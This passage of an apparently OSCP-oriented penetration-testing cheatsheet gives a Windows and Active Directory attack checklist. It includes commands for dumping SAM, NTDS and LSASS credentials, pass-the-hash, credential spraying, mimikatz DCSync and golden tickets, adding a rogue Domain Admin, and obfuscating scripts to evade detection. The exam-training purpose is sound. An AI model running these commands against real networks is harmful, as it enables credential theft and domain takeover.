                <li><input type="checkbox" data-id="rdp-saved-connections"> Saved RDP connections</li>
              </ul>
              <pre><code class="language-powershell">HKEY_USERS\&lt;SID&gt;\Software\Microsoft\Terminal Server Client\Servers\
HKCU\Software\Microsoft\Terminal Server Client\Servers\
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="remote-desktop-manager">
                  <code>Remote desktop credential manager</code>
                </li>
              </ul>
              <pre><code class="language-powershell"> %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="scclient-sccm"> SCClient \ SCCM</li>
              </ul>
              <pre><code class="language-powershell"># Check if the retrieved sotfwares are vulnerable to DLL Sideloading
# https://github.com/enjoiz/Privesc
$result = Get-WmiObject -Namespace "root\\ccm\\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="recycle-bin"> Check Recycle Bin</li>
              </ul>

              <h3 id="194-active-directory">19.4 Active Directory</h3>
              <h4 id="1941-external-machine">19.4.1 External Machine</h4>
              <p>Once logged in to the first machine, we&rsquo;ll begin by performing some basic enumeration to
                understand
                the
                environment and seek ways to escalate privileges.</p>
              <h5 id="19411-basic-enumeration">19.4.1.1 Basic Enumeration</h5>
              <ul>
                <li><input type="checkbox" data-id="hostname-ip-config"> <strong>Hostname and IP Configuration</strong>
                </li>
              </ul>
              <pre><code class="language-powershell">hostname
ipconfig /all
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="list-local-users"> <strong>List Local Users</strong>: enumerate
                  local
                  users to understand available accounts and check for any <code>inactive/legacy</code> accounts that
                  may
                  have weak passwords.</li>
              </ul>
              <pre><code class="language-powershell">net user
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="shared-directories"> <strong>Shared Directories</strong>: check for
                  accessible network shares that may contain sensitive information or further login credentials.</li>
              </ul>
              <pre><code class="language-powershell">net view \\[external_machine_ip]
</code></pre>
              <h5 id="19412-privilege-escalation">19.4.1.2 Privilege Escalation</h5>
              <ul>
                <li><input type="checkbox" data-id="service-misconfigurations"> <strong>(Technique 1) Service
                    Misconfigurations:</strong> identify services with weak permissions, and if you find a vulnerable
                  service that allows file modifications in its path, replace its executable with your own payload to
                  gain
                  higher privileges.</li>
              </ul>
              <pre><code class="language-powershell">sc query state= all | findstr &quot;SERVICE_NAME&quot;
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="password-hunting"> <strong>(Technique 2) Password Hunting:</strong>
                  search for sensitive files in common directories since they often contain clear-text passwords or
                  connection strings with credentials.</li>
              </ul>
              <pre><code class="language-powershell"># Look for them in C:\\ProgramData, C:\\Users\\All Users, and application-specific folders like C:\\Program Files.

dir /s /b C:\\Users\\Public\\*.config
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="dump-sam"> <strong>(Technique 3) Dumping SAM Database</strong>: if
                  you
                  have administrative privileges or gain access to the SAM (Security Account Manager) file, try to dump
                  it; then use <code>impacket-secretsdump</code> on the extracted SAM / NTDS and SYSTEM files to obtain
                  password hashes.</li>
              </ul>
              <pre><code class="language-bash"># Run in Windows
reg save HKLM\\SAM sam.save
reg save HKLM\\SYSTEM system.save

# Run in your Kali
impacket-secretsdump -sam &lt;sam_file&gt; -system &lt;system_file&gt; LOCAL
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="try-harder"> <strong>(Technique 4) Try Harder / Think Outside the
                    Box</strong>: at this point, relax, take a deep breath, give yourself a 5 minute break, and
                  remember:
                  <strong>the machine is designed to be vulnerable. Use all the others resources from this
                    cheatsheet</strong> from Section 7 (Windows Privilege Escalation), Sections 11-14 (Active Directory)
                  and Section 19.3.2 (Methodology for Windows Privilege Escalation). <em>Don&#39;t give up, you&#39;ve
                    come a long way to be here, with God&#39;s help you got this</em>.
                </li>
              </ul>
              <h4 id="1942-internal-machine">19.4.2 Internal Machine</h4>
              <p>Assuming you now have credentials or a hash from the external machine, we&#39;ll attempt to log into
                the
                internal machine.</p>
              <h5 id="19421-lateral-movement">19.4.2.1 Lateral Movement</h5>
              <ul>
                <li><input type="checkbox" data-id="pass-the-hash"> <strong>Pass-the-Hash (PtH)</strong>: if you
                  obtained
                  NTLM hashes, authenticate to the internal machine without knowing the password.</li>
              </ul>
              <pre><code class="language-bash"># Evil-WinRM
evil-winrm -i &lt;target_ip&gt; -u &lt;username&gt; -H 00000000000000000000000000000000:&lt;NTLM_hash&gt;

# PsExec
impacket-psexec &lt;username&gt;@&lt;target_ip&gt; -hashes 00000000000000000000000000000000:&lt;NTLM_hash&gt;

# VMIExec
impacket-wmiexec -hashes 00000000000000000000000000000000:&lt;NTLM_hash&gt; &lt;username&gt;@&lt;target_ip&gt;
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="credentials-reuse"> <strong>Credentials Reuse</strong>: if you have
                  plaintext credentials, log into the internal machine using available methods.</li>
              </ul>
              <pre><code class="language-bash"># RDP
xfreerdp /size:1920x1080 /u:[user] /p:[password] /v:[host/ip] /drive:desktop,/home/[your_username]/Desktop

# Evil-WinRM
evil-winrm -u &lt;username&gt; -p &lt;password&gt; -i &lt;target_ip&gt;

# PsExec
impacket-psexec &lt;username&gt;:&lt;password&gt;@&lt;target_ip&gt;

# VMIExec
impacket-wmiexec &lt;username&gt;:&lt;password&gt;@&lt;target_ip&gt;
</code></pre>
              <h5 id="19422-privilege-escalation">19.4.2.2 Privilege Escalation</h5>
              <ul>
                <li><input type="checkbox" data-id="gpp-abuse"> <strong>(Technique 1) Group Policy Preferences (GPP)
                    Abuse</strong>: check for <code>cpassword</code> in the <code>SYSVOL</code> share to obtain
                  plaintext
                  passwords stored in XML files.</li>
              </ul>
              <pre><code class="language-powershell"># Check for cpassword in the SYSvol share to obtain cleartext passwords in XML files.
dir \\\\&lt;domain&gt;\\SYSVOL\\&lt;domain&gt;\\Policies\\ /s /b | findstr cpassword

# Look for Groups.xml files which might contain cleartext passwords.
smbclient //dc-ip/SYSVOL -U &quot;domain\username&quot;
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="bloodhound-analysis"> <strong>(Technique 2) BloodHound
                    Analysis</strong>: use <code>SharpHound</code> to gather data for BloodHound, this will help
                  identify
                  paths to privileged accounts; then upload the data to <code>BloodHound</code> and examine the graph
                  for
                  possible privilege escalation paths, especially for
                  <strong><code>Shortest Path to Domain Admins</code></strong>.
                </li>
              </ul>
              <pre><code class="language-powershell">.\\SharpHound.exe -c All -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; -f AllData
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="scheduled-task-exploitation"> <strong>(Technique 3) Scheduled Task
                    and
                    Service Exploitation</strong>: check for any writable scheduled tasks or services that may allow
                  privilege escalation.</li>
              </ul>
              <pre><code class="language-powershell">schtasks /query /fo LIST /v
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="enumerate-internal-subdomains"> <strong>(Technique 4) Enumerate
                    Internal Subdomains</strong>: if
                  you found a possible local or internal subdomain of the Active Directory, <strong>enumerate too and
                    not
                    only in the AD but also in the other computers</strong>, this not only includes testing with WinRM
                  but
                  also enumerating its services.</li>
              </ul>
              <pre><code class="language-powershell"># Test for WinRM
crackmapexec winrm [domain_ip] -u [user_list].txt -p [found_passwords].txt --continue-on-success -d [subdomain.domain.com]
crackmapexec winrm [domain_ip] -u [user_list].txt -H [found_ntlm_hashes].txt --continue-on-success -d [subdomain.domain.com]

# Test for PsExec
crackmapexec smb [ip]  -u [user_list].txt -p [found_passwords].txt -d [subdomain.domain.com] --continue-on-success
crackmapexec smb [ip]  -u [user_list].txt -H [found_ntlm_hashes].txt -d [subdomain.domain.com] --continue-on-success

# Check if can find something else in the SMB
impacket-smbclient [user]:[password]@[ip]
impacket-smbclient [user]@[ip] -hashes 00000000000000000000000000000000:[valid_ntlm_hash]

# Test any other possible service or interesting thing you have found agains the subdomains
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="try-harder-internal"> <strong>(Technique 5) Try Harder / Think
                    Outside
                    the Box</strong>: at this point, relax, take a deep breath, give yourself a 5 minute break, and
                  remember: <strong>the machine is designed to be vulnerable. Use all the other resources from this
                    cheatsheet</strong> from Section 7 (Windows Privilege Escalation), Sections 11-14 (Active Directory)
                  and Section 19.3.2 (Methodology for Windows Privilege Escalation). <em>Don&#39;t give up, you&#39;ve
                    come a long way to be here, with God&#39;s help you got this</em>.</li>
              </ul>
              <h4 id="1943-domain-controller">19.4.3 Domain Controller</h4>
              <p>This machine is the Domain Controller, the final target, where final credentials and flags are likely
                stored.</p>

              <h5 id="19431-targeted-ad-attacks-on-dc">19.4.3.1 Targeted AD Attacks on DC</h5>
              <ul>
                <li><input type="checkbox" data-id="dcsync-attack"> <strong>(Technique 1) DCSync Attack</strong>: if you
                  have privileges for Replicating Directory Changes, execute a DCSync attack using
                  <code>mimikatz</code>.
                </li>
              </ul>
              <pre><code class="language-powershell">mimikatz # lsadump::dcsync /domain:&lt;domain&gt; /user:&lt;target_user&gt;
</code></pre>

              <ul>
                <li><input type="checkbox" data-id="dump-ntds-dit"> <strong>(Technique 2) Dumping the
                    <code>NTDS.dit</code> Database</strong>: first locate and copy the <code>NTDS.dit</code> database,
                  it
                  is usually in <code>C:\Windows\NTDS\</code>, or in a shadow copy; then <strong>copy both
                    <code>NTDS.dit</code> and <code>SYSTEM</code> registry hive</strong>; and then extract the
                  credentials
                  with <code>impacket-secretsdump</code>. You can check Sections 7.11.3 and 13.10 for a more detailed
                  guide related to this type of attack.</li>
              </ul>
              <pre><code class="language-bash">impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
</code></pre>

              <h5 id="19432-golden-ticket-attack-for-persistent-access">19.4.3.2 Golden Ticket Attack for Persistent
                Access</h5>
              <ul>
                <li><input type="checkbox" data-id="golden-ticket"> <strong>Create a Golden Ticket with
                    Mimikatz</strong>:
                  this attack will allow you to generate valid Kerberos tickets and impersonate any user indefinitely,
                  check Section 13.4 for a more detailed guide.</li>
              </ul>
              <pre><code class="language-powershell">kerberos::golden /domain:&lt;domain&gt; /sid:&lt;domain_SID&gt; /krbtgt:&lt;NTLM_hash&gt; /user:Administrator
</code></pre>

              <h5 id="19433-credential-harvesting-with-lsass">19.4.3.3 Credential Harvesting with LSASS</h5>
              <ul>
                <li><input type="checkbox" data-id="dump-lsass"> <strong>Dump <code>LSASS</code></strong>: this will
                  allow
                  you to retrieve clear-text credentials directly, you can check Section 6.12 for a more detailed guide
                  related to <code>Mimikatz</code> commands.</li>
              </ul>
              <pre><code class="language-powershell">mimikatz # sekurlsa::logonPasswords
</code></pre>
              <h4 id="1944-post-exploitation-and-flag-collection">19.4.4 Post-Exploitation and Flag Collection</h4>
              <p><strong>Flag Locations</strong>:</p>
              <ul>
                <li>
                  <p>Check for flags on each machine, they are usually located in <code>C:\\Users\\Public</code> or any
                    variation of <code>C:\\Users\\[Administrator/any_user]\\Desktop</code>.</p>
                </li>
                <li>
                  <p>Ensure to take a <strong>screenshot that includes the name of the machine, current user, its IP
                      address and the flag</strong>, within an interactive shell (no webshells).</p>
                </li>
              </ul>
              <pre><code class="language-powershell">hostname &amp;&amp; whoami &amp;&amp; ipconfig /all &amp;&amp; type [local/proof].txt
</code></pre>
              <p><strong>Persistence Setup (If Required)</strong>: if allowed, create a new domain user and add them to
                a
                privileged group, as an optional step you can use Section 18.4.5 to enable RDP if it is disabled.</p>
              <pre><code class="language-powershell">net user new_admin &lt;password&gt; /add /domain
net group &quot;Domain Admins&quot; new_admin /add /domain
</code></pre>
              <h4 id="1945-additional-tips-for-efficiency-and-stealth">19.4.5 Additional Tips for Efficiency and Stealth
              </h4>
              <ol>
                <li><strong>Use Stealthy Enumeration Tools</strong>: <code>Invoke-Obfuscation</code> can obfuscate
                  PowerShell scripts to bypass detection.</li>
                <li><strong>Document EVERYTHING</strong>: save all commands, paths, flags, screenshots, and credentials
                  obtained for accurate reporting.</li>
                <li><strong>Alternative Login Techniques</strong>: if <code>RDP</code> or <code>WinRM</code> fails; try
                  <code>SMBexec</code> , <code>CrackMapExec</code> , or <code>Evil-WinRM</code> as fallback methods.
                </li>
              </ol>

              <h2 id="20-references">20. <span class="emoji">üìö</span> References</h2>
              <p>[1] 0x4D31, &quot;Awesome OSCP,&quot; GitHub. [Online]. Available: <a
                  href="https://github.com/0x4D31/awesome-oscp">https://github.com/0x4D31/awesome-oscp</a>.</p>
              <p>[2] Aditya, &quot;OSCP Gitbook,&quot; [Online]. Available: <a
                  href="https://aditya-3.gitbook.io/oscp">https://aditya-3.gitbook.io/oscp</a>.</p>
              <p>[3] Blackc03r, &quot;OSCP Cheatsheets,&quot; GitHub. [Online]. Available: <a
                  href="https://github.com/blackc03r/OSCP-Cheatsheets">https://github.com/blackc03r/OSCP-Cheatsheets</a>.
              </p>
              <p>[4] Crsftw, &quot;OSCP,&quot; GitHub. [Online]. Available: <a
                  href="https://github.com/crsftw/oscp">https://github.com/crsftw/oscp</a>.</p>
              <p>[5] Exploit Notes, &quot;Port Forwarding with Chisel,&quot; [Online]. Available: <a
                  href="https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/">https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/</a>.
              </p>
              <p>[6] Gtworek, &quot;Priv2Admin,&quot; GitHub. [Online]. Available: <a
                  href="https://github.com/gtworek/Priv2Admin">https://github.com/gtworek/Priv2Admin</a>.</p>
              <p>[7] HackTricks, &quot;Generic Methodologies and Resources - Pentesting Methodology,&quot; [Online].
                Available: <a
                  href="https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-methodology">https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-methodology</a>.
              </p>
              <p>[8] HackTricks, &quot;Linux Hardening - Privilege Escalation,&quot; [Online]. Available: <a
                  href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation</a>.
              </p>
              <p>[9] HackTricks, &quot;Windows Local Privilege Escalation - Abusing Tokens,&quot; [Online]. Available:
                <a
                  href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens</a>.
              </p>
              <p>[10] Ignite Technologies, &quot;Linux Privilege Escalation,&quot; GitHub. [Online]. Available: <a
                  href="https://github.com/Ignitetechnologies/Linux-Privilege-Escalation">https://github.com/Ignitetechnologies/Linux-Privilege-Escalation</a>.
              </p>
              <p>[11] J. Gallimore, &quot;CVE-2021-44228 - Log4Shell Vulnerability,&quot; <em>Tomitribe</em>, Dec. 13,
                2021. [Online]. Available: <a
                  href="https://www.tomitribe.com/blog/cve-2021-44228-log4shell-vulnerability/">https://www.tomitribe.com/blog/cve-2021-44228-log4shell-vulnerability/</a>.
                [Accessed: 08-Oct-2024].</p>
              <p>[12] Lagarian Smith, &quot;OSCP Cheat Sheet,&quot; GitLab. [Online]. Available: <a
                  href="https://gitlab.com/lagarian.smith/oscp-cheat-sheet/-/blob/master/OSCP_Notes.md#https-443">https://gitlab.com/lagarian.smith/oscp-cheat-sheet/-/blob/master/OSCP_Notes.md#https-443</a>.
              </p>
              <p>[13] Liodeus, &quot;OSCP Personal Cheatsheet,&quot; [Online]. Available: <a
                  href="https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html">https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html</a>.
              </p>
              <p>[14] Nicocha30, &quot;Ligolo NG,&quot; GitHub. [Online]. Available: <a
                  href="https://github.com/Nicocha30/ligolo-ng">https://github.com/Nicocha30/ligolo-ng</a>.</p>
              <p>[15] Orange Cyber Defense, &quot;Pentest AD Mindmap,&quot; [Online]. Available: <a
                  href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg">https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg</a>.
              </p>
              <p>[16] P3t3rp4rk3r, &quot;OSCP Cheat Sheet,&quot; GitHub. [Online]. Available: <a
                  href="https://github.com/P3t3rp4rk3r/OSCP-cheat-sheet-1?files=1">https://github.com/P3t3rp4rk3r/OSCP-cheat-sheet-1?files=1</a>.
              </p>
              <p>[17] Rajchowdhury420, &quot;Linux - Privilege Escalation,&quot; GitHub. [Online]. Available: <a
                  href="https://github.com/Rajchowdhury420/OSCP-CheatSheet/blob/main/Linux - Privilege Escalation.md">https://github.com/Rajchowdhury420/OSCP-CheatSheet/blob/main/Linux%20-%20Privilege%20Escalation.md</a>.
              </p>
              <p>[18] Senderend, &quot;Hackbook,&quot; GitHub. [Online]. Available: <a
                  href="https://github.com/senderend/hackbook">https://github.com/senderend/hackbook</a>.</p>
              <p>[19] S1ckB0y1337, &quot;Active Directory Exploitation Cheat Sheet,&quot; GitHub. [Online]. Available:
                <a
                  href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet</a>.
              </p>
              <p>[20] Sushant747, &quot;Total OSCP Guide - Linux Privilege Escalation,&quot; Gitbook. [Online].
                Available:
                <a
                  href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html">https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html</a>.
              </p>
              <p>[21] Software Sinner, &quot;How to Tunnel and Pivot Networks Using Ligolo NG,&quot; Medium. [Online].
                Available: <a
                  href="https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740">https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740</a>.
              </p>
              <p>[22] StudyLib, &quot;OSCP Methodology,&quot; [Online]. Available: <a
                  href="https://studylib.net/doc/27094061/oscp-methodology">https://studylib.net/doc/27094061/oscp-methodology</a>.
              </p>
              <p>[23] Whimsical, &quot;Active Directory,&quot; [Online]. Available: <a
                  href="https://whimsical.com/active-directory-YJFeAhW9GMtmLX4SWxKCCM">https://whimsical.com/active-directory-YJFeAhW9GMtmLX4SWxKCCM</a>.
              </p>
              <p>[24] Whimsical, &quot;Active Directory,&quot; [Online]. Available: <a
                  href="https://whimsical.com/active-directory-YJFeAhW9GMtmLX4SWxKCCM">https://whimsical.com/active-directory-YJFeAhW9GMtmLX4SWxKCCM</a>.
              </p>
              <p>[25] WWong99, &quot;OSCP Survival Guide,&quot; GitHub. [Online]. Available: <a
                  href="https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md#shells">https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md#shells</a>.
              </p>
              <p>[26] xsudoxx, &quot;OSCP,&quot; GitHub. [Online]. Available: <a
                  href="https://github.com/xsudoxx/OSCP">https://github.com/xsudoxx/OSCP</a>.</p>


            </div>
          </div>
        </div>

      </div>
    </section><!-- End Cheatsheet Section -->

  </main><!-- End #main -->

  <!-- ======= Index ======= -->
  <div class="index-btn" onclick="toggleIndex()">Index</div>
  <div id="index" class="index">
    <div class="container mt-3">
      <div class="input-group mb-3">
        <input type="text" id="search-input" class="form-control" placeholder="Search sections..."
          aria-label="Search sections" aria-describedby="search-button">
        <button class="btn btn-primary" type="button" id="search-button">
          <i class="bi bi-search"></i>
        </button>
      </div>
    </div>
    <button class="expand-collapse-btn" onclick="toggleAll()">Show/Hide All</button>
    <div class="section-rose">
      <button class="dropdown-btn">1. <span class="emoji">üïµÔ∏è‚Äç‚ôÇÔ∏è</span> Information Gathering
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <a href="#11-passive-information-gathering">1.1 Passive Information Gathering</a>
        <a href="#12-dns-enumeration">1.2 DNS Enumeration</a>
        <button class="dropdown-btn">1.3 Port Scanning
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#131-netcat">1.3.1 Netcat</a>
          <button class="dropdown-btn">1.3.2 Nmap
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#1321-personal-methodology">1.3.2.1 Personal Methodology</a>
            <a href="#1322-scan-types">1.3.2.2 Scan Types</a>
            <a href="#1323-detection-and-scanning">1.3.2.3 Detection and Scanning</a>
            <a href="#1324-saving-results">1.3.2.4 Saving Results</a>
            <a href="#1325-nmap-scripting-engine-nse">1.3.2.5 Nmap Scripting Engine (NSE)</a>
            <a href="#1326-powershell-functions">1.3.2.6 PowerShell Functions</a>
          </div>
          <a href="#133-rustscan">1.3.3 Rustscan</a>
        </div>
        <button class="dropdown-btn">1.4 Specific Port Services
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#141-21--ftp">1.4.1 21: FTP</a>
          <a href="#142-22-ssh">1.4.2 22: SSH</a>
          <a href="#143-23-telnet">1.4.3 23: Telnet</a>
          <a href="#144-25-smtp">1.4.4 25: SMTP</a>
          <a href="#145-53-dns">1.4.5 53: DNS</a>
          <a href="#146-69-tftp">1.4.6 69: TFTP</a>
          <a href="#147-88-kerberos">1.4.7 88: Kerberos</a>
          <a href="#148-110-pop3">1.4.8 110: POP3</a>
          <a href="#149-111-rpc">1.4.9 111: RPC</a>
          <a href="#1410-135-593-msrpc">1.4.10 135, 593: MSRPC</a>
          <a href="#1411-139-445-smb">1.4.11 139, 445: SMB</a>
          <a href="#1412-143-993-imap">1.4.12 143, 993: IMAP</a>
          <a href="#1413-161-udp-snmp">1.4.13 161 (UDP): SNMP</a>
          <a href="#1414-389-636-3268--3269-ldap">1.4.14 389, 636, 3268 &amp; 3269: LDAP</a>
          <a href="#1415-1433-mssql">1.4.15 1433: MSSQL</a>
          <a href="#1416-2049-nfs">1.4.16 2049: NFS</a>
          <a href="#1417-3003-cgms-possible">1.4.17 3003: CGMS (possible)</a>
          <a href="#1418-3306-mysql">1.4.18 3306: MYSQL</a>
          <a href="#1419-3389-rdp">1.4.19 3389: RDP</a>
          <a href="#1420-5432-5433-postgresql">1.4.20 5432, 5433: PostgreSQL</a>
          <a href="#1421-5900-vnc-virtual-network-computing">1.4.21 5900: VNC (Virtual Network Computing)</a>
          <a href="#1422-5985-5986-winrm">1.4.22 5985, 5986: WinRM</a>
          <a href="#1423-6379-redis">1.4.23 6379: Redis</a>
          <a href="#1424-unkown-port">1.4.24 Unkown Port</a>
        </div>
      </div>
    </div>

    <div class="section-mint-green">
      <button class="dropdown-btn">2. <span class="emoji">üîé</span> Vulnerability Scanning
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <a href="#21-nessus">2.1 Nessus</a>
        <a href="#22-nmap-nse-nmap-scripting-engine">2.2 Nmap NSE (Nmap Scripting Engine)</a>
      </div>
    </div>

    <div class="section-lemon">
      <button class="dropdown-btn">3. <span class="emoji">üï∑Ô∏è</span> Web Applications
        <i class="bi bi-caret-down-fill"></i>
      </button>
      <div class="dropdown-container">
        <button class="dropdown-btn">3.1 Enumeration
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#311-fingerprinting">3.1.1 Fingerprinting</a>
          <button class="dropdown-btn">3.1.2 Directory Discover
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#3121-ffuf">3.1.2.1 FFUF</a>
            <a href="#3122-dirb">3.1.2.2 DIRB</a>
            <a href="#3123-gobuster">3.1.2.3 GOBUSTER</a>
            <a href="#3124-feroxbuster">3.1.2.4 FEROXBUSTER</a>
            <a href="#3125-dirsearch">3.1.2.5 DIRSEARCH</a>
            <a href="#3126-wfuzz">3.1.2.6 WFUZZ</a>
          </div>
          <button class="dropdown-btn">3.1.3 File Discover
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#3131-ffuf">3.1.3.1 FFUF</a>
            <a href="#3132-dirb">3.1.3.2 DIRB</a>
            <a href="#3133-gobuster">3.1.3.3 GOBUSTER</a>
            <a href="#3134-feroxbuster">3.1.3.4 FEROXBUSTER</a>
            <a href="#3135-dirsearch">3.1.3.5 DIRSEARCH</a>
          </div>
          <a href="#314-git-exposed">3.1.4 Git Exposed</a>
          <a href="#315-cms">3.1.5 CMS</a>
          <a href="#316-webdav">3.1.6 WebDav</a>
          <a href="#317-apis">3.1.7 APIs</a>
          <a href="#318-wordlists">3.1.8 Wordlists</a>
        </div>
        <button class="dropdown-btn">3.2 XSS
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#321-theory">3.2.1 Theory</a>
          <a href="#322-stored">3.2.2 Stored</a>
          <a href="#323-reflected">3.2.3 Reflected</a>
          <a href="#324-blind">3.2.4 Blind</a>
          <a href="#325-privesc-using-session-hijacking">3.2.5 PrivEsc Using Session Hijacking</a>
          <a href="#326-wordpress-httponly-cookie-visitor-plugin">3.2.6 Wordpress HttpOnly Cookie (Visitor Plugin)</a>
          <a href="#327-automated-discovery">3.2.7 Automated Discovery</a>
        </div>
        <button class="dropdown-btn">3.3 File Inclusion
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <button class="dropdown-btn">3.3.1 Local File Inclusion (LFI)
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#3311-scanning-for-lfi">3.3.1.1 Scanning for LFI</a>
            <a href="#3312-bypassing-lfi-protections">3.3.1.2 Bypassing LFI Protections</a>
            <a href="#3313-lfi-wrappers">3.3.1.3 LFI Wrappers</a>
            <button class="dropdown-btn">3.3.1.4 Remote Code Execution via LFI
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#33141-log-poisoning-apache-or-ssh-logs">3.3.1.4.1 Log Poisoning (Apache or SSH Logs)</a>
              <a href="#33142-mail-php-execution-rce-via-email">3.3.1.4.2 Mail PHP Execution (RCE via Email)</a>
            </div>
            <a href="#3315-reverse-shell-via-lfi">3.3.1.5 Reverse Shell via LFI</a>
            <a href="#3316-useful-tools">3.3.1.6 Useful Tools</a>
          </div>
          <button class="dropdown-btn">3.3.2 Remote File Inclusion (RFI)
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#3321-basic-rfi-example">3.3.2.1 Basic RFI Example</a>
            <a href="#3322-reverse-shell-via-rfi">3.3.2.2 Reverse Shell via RFI</a>
          </div>
          <button class="dropdown-btn">3.3.3 WordPress Plugin for Reverse Shell
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#3331-malicious-wordpress-plugin-generators">3.3.3.1 Malicious WordPress Plugin Generators</a>
            <a href="#3332-reverse-shell-options">3.3.3.2 Reverse Shell Options</a>
            <a href="#3333-php-webshell">3.3.3.3 PHP Webshell</a>
            <a href="#3334-asp-webshell">3.3.3.4 ASP Webshell</a>
            <a href="#3335-non-meterpreter-payload-for-netcat">3.3.3.5 Non-Meterpreter Payload for Netcat</a>
          </div>
          <button class="dropdown-btn">3.3.4 Files and Paths to Target (LFI &amp; RFI)
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <a href="#3341-common-linux-files">3.3.4.1 Common Linux Files</a>
            <a href="#3342-common-windows-files">3.3.4.2 Common Windows Files</a>
          </div>
          <a href="#335-php-wrappers">3.3.5 PHP Wrappers</a>
          <a href="#336-os-command-injection">3.3.6 OS Command Injection</a>
        </div>
        <button class="dropdown-btn">3.4 File Upload Vulnerabilities
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <a href="#341-disabling-frontend-validation">3.4.1 Disabling Frontend Validation</a>
          <a href="#342-extensions-blacklist">3.4.2 Extensions Blacklist</a>
          <a href="#343-extensions-whitelist">3.4.3 Extensions Whitelist</a>
          <a href="#344-bypassing-filters">3.4.4 Bypassing Filters</a>
          <a href="#345-file-execution">3.4.5 File Execution</a>
          <a href="#346-embed-code-into-images">3.4.6 Embed Code into Images</a>
          <a href="#347-embed-code-into-file-names">3.4.7 Embed Code into File Names</a>
        </div>
        <button class="dropdown-btn">3.5 SQL Attacks
          <i class="bi bi-caret-down-fill"></i>
        </button>
        <div class="dropdown-container">
          <button class="dropdown-btn">3.5.1 Tools for Connecting Usage
            <i class="bi bi-caret-down-fill"></i>
          </button>
          <div class="dropdown-container">
            <button class="dropdown-btn">3.5.1.1 <code>MySQL</code> for MySQL (Linux)
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#35111-initial-connection">3.5.1.1.1 Initial Connection</a>
              <a href="#35112-common-queries">3.5.1.1.2 Common Queries</a>
              <a href="#35113-enumerating-tables-and-columns">3.5.1.1.3 Enumerating Tables and Columns</a>
              <a href="#35114-user-enumeration-and-privileges">3.5.1.1.4 User Enumeration and Privileges</a>
              <a href="#35115-data-extraction">3.5.1.1.5 Data Extraction</a>
              <a href="#35116-command-execution-via-user-defined-functions-udfs">3.5.1.1.6 Command Execution via
                User-Defined Functions (UDFs)</a>
              <a href="#35117-reverse-shell">3.5.1.1.7 Reverse Shell</a>
              <a href="#35118-where-to-get-your-so-for-udf">3.5.1.8 Where to Get Your <code>.so</code> for UDF</a>
            </div>
            <button class="dropdown-btn">3.5.1.2 <code>Mssqlclient</code> for MSSQL (Windows)
              <i class="bi bi-caret-down-fill"></i>
            </button>
            <div class="dropdown-container">
              <a href="#35121-initial-connection">3.5.1.2.1 Initial Connection</a>
              <a href="#35122-common-queries">3.5.1.2.2 Common Queries</a>
              <a href="#35123-enumerating-tables-and-columns">3.5.1.2.3 Enumerating Tables and Columns</a>
